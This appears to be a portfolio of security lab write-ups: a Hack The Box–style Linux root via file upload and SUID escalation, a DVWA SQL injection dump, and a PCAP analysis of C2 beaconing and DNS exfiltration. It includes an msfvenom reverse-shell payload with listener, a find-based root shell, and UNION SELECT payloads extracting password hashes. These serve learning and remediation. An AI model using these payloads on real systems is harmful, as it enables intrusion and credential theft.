Technical Write-ups

01 HTB Machine — Linux Privilege Escalation via SUID Binary
HTBPriv Esc
▶
objective
Root a Linux target machine via service enumeration, initial access through a vulnerable web application, and privilege escalation using a misconfigured SUID binary.
phase 1 — reconnaissance
Full port scan revealed SSH (22), HTTP (80) and an unusual service on port 8080. Nikto and Gobuster identified a hidden admin panel at /admin with default credentials admin:admin.
nmap -sV -sC -p- --min-rate 5000 10.10.11.x
gobuster dir -u http://10.10.11.x -w /usr/share/wordlists/dirbuster/medium.txt
Found: /admin (Status: 200)
Found: /backup (Status: 403)
phase 2 — initial access
Admin panel had a file upload function with insufficient validation. Uploaded a PHP reverse shell disguised with double extension (.php.jpg). Started Netcat listener, triggered the shell.
msfvenom -p php/reverse_php LHOST=10.10.14.x LPORT=4444 -f raw -o shell.php.jpg
nc -lvnp 4444
[+] Connection received from 10.10.11.x
$ whoami → www-data
phase 3 — privilege escalation
Enumerated SUID binaries. Found /usr/bin/find with SUID bit set. Used GTFOBins technique to escalate to root.
find / -perm -4000 -type f 2>/dev/null
/usr/bin/find (SUID — vulnerable!)
find . -exec /bin/bash -p \; -quit
bash-5.1# whoami → root
bash-5.1# cat /root/root.txt → [FLAG CAPTURED]
remediation
Remove SUID bit from /usr/bin/find. Implement file upload validation (whitelist extensions, check MIME type, store outside webroot). Change default admin credentials. Disable directory listing.
02 SQL Injection — Manual Exploitation & Data Extraction
Web AppSQLi
▶
target
DVWA (Damn Vulnerable Web Application) running on local lab instance, security level: low. Goal: extract the entire user database including password hashes.
discovery & enumeration
Input field in user search parameter. Tested with single quote — received MySQL syntax error confirming injection point. Determined number of columns with ORDER BY.
1' -- -     → MySQL error (injection confirmed)
1' ORDER BY 1-- - → 200 OK
1' ORDER BY 2-- - → 200 OK
1' ORDER BY 3-- - → Error (2 columns confirmed)
exploitation
Used UNION SELECT to extract database name, enumerate tables, then dump the users table.
1' UNION SELECT null,database()-- -      → dvwa
1' UNION SELECT null,group_concat(table_name) FROM information_schema.tables WHERE table_schema='dvwa'-- -
→ guestbook,users
1' UNION SELECT null,group_concat(user,0x3a,password) FROM users-- -
→ admin:5f4dcc3b5aa765d61d8327deb882cf99
hashcat -m 0 hash.txt rockyou.txt    → password
impact & remediation
Full database read access. All user credentials exposed. Fix: use parameterised queries / prepared statements, implement WAF, hash passwords with bcrypt (not MD5), apply principle of least privilege on DB user.

04 Network PCAP Analysis — C2 Beaconing & DNS Exfiltration
NetworkDFIR
▶
scenario
Analysed a 50MB PCAP capture from a simulated corporate network. Suspected compromise based on performance degradation and unusual DNS queries reported by network admin.
C2 beacon detection
Filtered HTTP POST requests — identified regular beaconing every 60 seconds to a single external IP. Base64-encoded payloads in the User-Agent string, consistent with Cobalt Strike HTTP profile.
tshark -r capture.pcap -Y "http.request.method==POST"
Regular intervals: 60.0s ±12s → C2 beacon pattern
tshark -r capture.pcap -Y "http.request.method==POST" -T fields -e http.user_agent
Mozilla/5.0 ... (dWVyYWdlbnQ= base64 encoded payload)
DNS exfiltration
DNS queries showed high-entropy subdomain requests — DGA (Domain Generation Algorithm) pattern. Large volume of NXDomain responses confirmed data being encoded in DNS labels.
tshark -r capture.pcap -Y "dns" | awk '{print $12}' | sort | uniq -c | sort -rn
High-entropy subdomains: a3f8b2c1d4.exfil-domain.com
DGA pattern confirmed — 847 unique subdomains in 2 hours
Estimated data exfiltrated: ~2.4MB via DNS tunnelling
